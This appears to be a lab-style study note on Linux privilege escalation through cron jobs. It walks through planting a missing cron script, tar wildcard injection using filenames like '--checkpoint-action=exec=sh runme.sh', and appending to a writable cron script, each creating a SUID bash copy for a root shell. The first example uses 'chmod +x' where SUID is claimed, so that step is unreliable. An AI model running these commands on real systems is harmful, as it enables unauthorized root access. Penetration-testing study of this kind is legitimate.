# Escalation via Scheduled task (Cron)

## Cron Path

### Enumeration

- We have to check in the crontab for example with `cat /etc/crontab` if we can not read this file we still could check other ways to enumerate scheduled task using [payload all the things documentation](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md#scheduled-tasks) or an enumeration tool like linpeas
- In our example the system will try to run a file that does not exist (if we ls in home/user we do not see it)   
![image](https://user-images.githubusercontent.com/96747355/170375060-4d8fc104-2b34-4dc8-82e1-86eefe247b1b.png)  
- So we can try to create a file named overwrite.sh and make it escalate privileges

### Exploitation

- `echo 'cp /bin/bash /tmp/bash; chmod +x /tmp/bash' > /home/user/overwrite.sh` we create our overwrite file. Our script will create a bash with suid priv
- `chmod +x /home/user/overwrite.sh` we need to make it executable
- `/tmp/bash -p` we execute it and we get root  
![image](https://user-images.githubusercontent.com/96747355/170377045-4b98a2fb-2d52-43ea-bfc7-1b84f8d78e5a.png)  

## Cron Wildcards

### Enumeration

- `cat /etc/crontab` in our example we have a `/usr/local/bin/compress.sh`  
![image](https://user-images.githubusercontent.com/96747355/170485258-123fce9b-325f-4450-a7c8-de8edf88b3ef.png)  
- We can have a look at the script `cat  /usr/local/bin/compress.sh`  
![image](https://user-images.githubusercontent.com/96747355/170486526-94adfcff-62fd-46d2-8920-72c284644a31.png)  
- The script goes to the user home and makes a backup of the content using a wildcard `*` and stores it in tmp
- We can not modify the script so we need to do something that uses the script to get our privesc. In order to do so we can do command related to tar as the script uses it.

### Exploitation

- `echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/runme.sh` we create a malicious bash
- `touch /home/user/--checkpoint=1` when the scheduled script is going to read the home directory it will have a file named as a tar command, so it will interpret it. This command displays a status message every 1 
- `touch /home/user/--checkpoint-action=exec=sh\ runme.sh` then this command is going to make and action when the checkpoint we created before is hit
- After a minute we can then launch our bash `/tmp/bash -p`
- We should be root!  
![image](https://user-images.githubusercontent.com/96747355/170489169-16815170-1f9e-4822-b9ad-539e6e3ea19c.png)  

## Cron files overwrite

### Enumeration

- `cat /etc/crontab` in our example we will use the file overwrite.sh  
![image](https://user-images.githubusercontent.com/96747355/170490233-f04c2ed3-b9d9-43ff-a28c-9e2f2e5c5044.png)  
- We locate where is the file using `locate overwrite.sh`
- Check the permission on the file we want to overwrite `ls -l /usr/local/bin/overwrite.sh`  
![image](https://user-images.githubusercontent.com/96747355/170490298-b00a49a7-ab58-4410-bfe3-18a45927d3eb.png)  
- We can overwrite it

### Exploitation

- `echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' >> /usr/local/bin/overwrite.sh` We are overwriting the file with a command that will copy bash and give it suid perms
- After a minute we should be able to launch `/tmp/bash -p`
- We should be root!  
![image](https://user-images.githubusercontent.com/96747355/170490883-6c7020b8-fe46-4c8e-9041-c751990ebb33.png)  
